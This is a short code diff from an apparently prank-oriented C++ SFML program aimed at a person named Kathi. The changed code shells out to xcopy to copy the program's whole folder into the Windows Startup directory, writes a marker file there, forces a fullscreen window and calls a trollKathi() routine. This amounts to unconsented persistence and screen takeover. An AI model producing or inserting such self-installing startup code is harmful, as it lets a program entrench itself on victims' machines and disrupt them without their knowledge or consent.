@@ -41,11 +41,12 @@ int main(int argc, char *args[]){
         return 0;
     }
     else{
-        string command = "xcopy \"";
-        command += args[0];
-        command += "\" %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\";
+        string path = args[0];
+        path.resize(path.find_last_of('\\')+1);
+        string command = "xcopy /Y \"";
+        command += path;
+        command += "*\" %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\";
         system(command.c_str());
-        system("echo > %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\1");
     }
     RenderWindow window(sf::VideoMode::getDesktopMode(), "SFML", sf::Style::Fullscreen);
     test_ismade.close();
@@ -227,6 +228,7 @@ int main(int argc, char *args[]){
         window.display();
     }
     //kathi
+    system("echo > %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\1");
     trollKathi();
     return 0;
 }
